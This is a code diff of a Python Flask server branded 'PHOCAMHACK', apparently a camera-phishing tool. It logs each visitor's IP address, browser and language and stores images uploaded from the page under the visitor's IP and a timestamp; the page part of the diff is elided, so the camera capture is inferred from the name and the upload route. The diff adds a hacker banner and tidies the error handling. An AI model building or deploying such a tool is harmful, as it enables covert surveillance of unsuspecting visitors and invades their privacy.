@@ -3,10 +3,20 @@ import os
 from datetime import datetime
 
 app = Flask(__name__)
+os.system("cls")
+print("""
 
+██████╗░██╗░░██╗░█████╗░░█████╗░░█████╗░███╗░░░███╗██╗░░██╗░█████╗░░█████╗░██╗░░██╗
+██╔══██╗██║░░██║██╔══██╗██╔══██╗██╔══██╗████╗░████║██║░░██║██╔══██╗██╔══██╗██║░██╔╝
+██████╔╝███████║██║░░██║██║░░╚═╝███████║██╔████╔██║███████║███████║██║░░╚═╝█████═╝░
+██╔═══╝░██╔══██║██║░░██║██║░░██╗██╔══██║██║╚██╔╝██║██╔══██║██╔══██║██║░░██╗██╔═██╗░
+██║░░░░░██║░░██║╚█████╔╝╚█████╔╝██║░░██║██║░╚═╝░██║██║░░██║██║░░██║╚█████╔╝██║░╚██╗
+╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
+-- BY: MLBSANS
+-- github: https://github.com/mlbsans""")
 # Đường dẫn lưu ảnh
-SAVE_PATH = r"IMAGE"
-os.makedirs(SAVE_PATH, exist_ok=True)  # Tạo thư mục nếu chưa có
+SAVE_PATH = "IMAGE"
+os.makedirs(SAVE_PATH, exist_ok=True)  # Đảm bảo thư mục tồn tại
 
 HTML_PAGE = """  
 <!DOCTYPE html>
@@ -226,36 +236,37 @@ HTML_PAGE = """
   </script>
 </body>
 </html>
-"""
-# Xog phần html wed
-@app.route('/')  
+"""  
+@app.route('/')
 def index():
     user_ip = request.remote_addr
     user_agent = request.headers.get('User-Agent', 'Không xác định')
     language = request.headers.get('Accept-Language', 'Không xác định')
     
-    print("\033[32m[=====================]\033[0m")
-    print(f"\033[36m[+]: IPv4: {user_ip}\033[0m")
-    print("\033[36m[+]: IPv6: Không xác định\033[0m")
+    print(f"\033[32m[+]: IPv4: {user_ip}\033[0m")
     print(f"\033[36m[+]: Hệ điều hành: {user_agent}\033[0m")
     print(f"\033[36m[+]: Ngôn ngữ: {language}\033[0m")
-    print("\033[31m--- Hết ---\033[0m")
-    print("\033[32m[=====================]\033[0m")
-    
+
     return render_template_string(HTML_PAGE)
 
-@app.route('/upload', methods=['POST'])  
+@app.route('/upload', methods=['POST'])
 def upload():
-    if 'image' in request.files:
-        image = request.files['image']
-        user_ip = request.remote_addr
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        image_path = os.path.join(SAVE_PATH, f"{user_ip}_{timestamp}.png")
-        image.save(image_path)
+    if 'image' not in request.files:
+        return "Lỗi khi nhận ảnh!", 400
 
-        print(f"\033[32m[📷] Ảnh đã chụp từ IP {user_ip}: {image_path}\033[0m")
+    image = request.files['image']
+    user_ip = request.remote_addr
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    image_path = os.path.join(SAVE_PATH, f"{user_ip}_{timestamp}.png")
+
+    try:
+        os.makedirs(SAVE_PATH, exist_ok=True)  # Đảm bảo thư mục tồn tại
+        image.save(image_path)
+        print(f"\033[32m[📷] Ảnh đã lưu: {image_path}\033[0m")
         return "OK", 200
-    return "Lỗi khi nhận ảnh!", 400
+    except Exception as e:
+        print(f"\033[31mLỗi khi lưu ảnh: {e}\033[0m")
+        return "Lỗi khi lưu ảnh!", 500
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080, debug=True)
